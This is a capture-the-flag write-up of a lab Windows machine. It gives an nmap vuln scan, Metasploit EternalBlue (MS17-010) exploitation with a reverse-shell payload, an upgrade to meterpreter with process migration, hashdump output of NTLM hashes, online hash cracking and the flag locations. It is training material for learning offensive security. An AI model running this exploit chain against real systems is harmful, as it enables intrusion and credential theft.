# Blue - itsnexn - 27/mar/2021

## Recon
### Scan(Nmap)
COMMAND:
```bash
nmap -sV -vv --script vuln 10.10.52.140 -oN scan/nmap
```

We start with nmap scan in `scan/nmap`:
```
# Nmap 7.91 scan initiated Sat Mar 27 23:36:59 2021 as: nmap -sV -vv --script vuln -oN scan/nmap 10.10.52.140
Increasing send delay for 10.10.52.140 from 0 to 5 due to 15 out of 49 dropped probes since last increase.
Nmap scan report for 10.10.52.140
Host is up, received conn-refused (0.19s latency).
Scanned at 2021-03-27 23:37:10 +0430 for 176s
Not shown: 991 closed ports
Reason: 991 conn-refused
PORT      STATE SERVICE            REASON  VERSION
135/tcp   open  msrpc              syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn        syn-ack Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       syn-ack Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server? syn-ack
| rdp-vuln-ms12-020:
|   VULNERABLE:
|   MS12-020 Remote Desktop Protocol Denial Of Service Vulnerability
|     State: VULNERABLE
|     IDs:  CVE:CVE-2012-0152
|     Risk factor: Medium  CVSSv2: 4.3 (MEDIUM) (AV:N/AC:M/Au:N/C:N/I:N/A:P)
|           Remote Desktop Protocol vulnerability that could allow remote attackers to cause a denial of service.
|
|     Disclosure date: 2012-03-13
|     References:
|       http://technet.microsoft.com/en-us/security/bulletin/ms12-020
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0152
|
|   MS12-020 Remote Desktop Protocol Remote Code Execution Vulnerability
|     State: VULNERABLE
|     IDs:  CVE:CVE-2012-0002
|     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)
|           Remote Desktop Protocol vulnerability that could allow remote attackers to execute arbitrary code on the targeted system.
|
|     Disclosure date: 2012-03-13
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0002
|_      http://technet.microsoft.com/en-us/security/bulletin/ms12-020
|_ssl-ccs-injection: No reply from server (TIMEOUT)
|_sslv2-drown:
49152/tcp open  msrpc              syn-ack Microsoft Windows RPC
49153/tcp open  unknown            syn-ack
49154/tcp open  msrpc              syn-ack Microsoft Windows RPC
49158/tcp open  msrpc              syn-ack Microsoft Windows RPC
49160/tcp open  msrpc              syn-ack Microsoft Windows RPC
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Mar 27 23:40:06 2021 -- 1 IP address (1 host up) scanned in 187.12 seconds
```


### TASKS
How many ports are open with a port number under 1000? `Hint: Near the top of the nmap output: PORT STATE SERVICE`
```
¯\_(ツ)_/¯
```

What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067) `Hint: Revealed by the ShadowBrokers, exploits an issue within SMBv1`
```
¯\_(ツ)_/¯
```
## Gain Access

### MSFconsole
```
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMM                MMMMMMMMMM
MMMN$                           vMMMM
MMMNl  MMMMM             MMMMM  JMMMM
MMMNl  MMMMMMMN       NMMMMMMM  JMMMM
MMMNl  MMMMMMMMMNmmmNMMMMMMMMM  JMMMM
MMMNI  MMMMMMMMMMMMMMMMMMMMMMM  jMMMM
MMMNI  MMMMMMMMMMMMMMMMMMMMMMM  jMMMM
MMMNI  MMMMM   MMMMMMM   MMMMM  jMMMM
MMMNI  MMMMM   MMMMMMM   MMMMM  jMMMM
MMMNI  MMMNM   MMMMMMM   MMMMM  jMMMM
MMMNI  WMMMM   MMMMMMM   MMMM#  JMMMM
MMMMR  ?MMNM             MMMMM .dMMMM
MMMMNm `?MMM             MMMM` dMMMMM
MMMMMMN  ?MM             MM?  NMMMMMN
MMMMMMMMNe                 JMMMMMNMMM
MMMMMMMMMMNm,            eMMMMMNMMNMM
MMMMNNMNMMMMMNx        MMMMMMNMMNMMNM
MMMMMMMMNMMNMMMMm+..+MMNMMNMNMMNMMNMM
```

At first we start to search our vulnerability `search ms17-010`
Then after find exploit we just use it!!!`use exploit/windows/smb/ms17_010_eternalblue`
Then we set our `RHOSTS` like this `set RHOSTS 10.10.52.140`
its better to use payload so we set out payload like so:`set payload windows/x64/shell/reverse_tcp`

Yes we get our sehll or its better to say RCE ig ...




### TASKS
Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)`Hint: search ms??`
```
¯\_(ツ)_/¯
```

Show options and set the one required value. What is the name of this value? (All caps for submission)`Hint: Command: show options`
```
¯\_(ツ)_/¯
```

## Escalate

after get RCE we going to use `shell_to_meterpreter` module to find users and password hash's so first we hit CTRL+Z to send RCE to background
than we just `use post/multi/manage/shell_to_meterpreter` and then we use `session -l` to list our sessions then we `set SESSION 1` and run exploit ...
we use `ps` to show processes and migrate to them ...
after some attempts we find our psID to migrate to `svchost.exe | 708`


### TASKS
What is the name of the post module we will use?`Hint: Google this: shell_to_meterpreter`
```
¯\_(ツ)_/¯
```

Select this (use MODULE_PATH). Show options, what option are we required to change?
```
¯\_(ツ)_/¯
```

## Cracking

after migrate to psID we found we use our `hashdump` command to see users hash's:
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```
then we use `https://crackstation.net/` to crack the password hash...

### TASKS
What is the name of the non-default user?
```
¯\_(ツ)_/¯
```

 Copy this password hash to a file and research how to crack it. What is the cracked password?
```
¯\_(ツ)_/¯
```

## Find flags!

we found our first flag in `C:\flag1.txt`...
and second one in `C:\windows\system32\config\flag2.txt`
and for third flag after some time i can find flag on C:\Users\Jon\Documents\flag3.txt

### TASKS
Flag1? This flag can be found at the system root.`Hint: Can you C it?`
```
¯\_(ツ)_/¯
```

Flag2? This flag can be found at the location where passwords are stored within Windows.`Hint: I wish I wrote down where I kept my password. Luckily it's still stored here on Windows.`
```
¯\_(ツ)_/¯
```

flag3? This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved.`Hint: You'll need to have elevated privileges to access this flag.
`
```
¯\_(ツ)_/¯
```
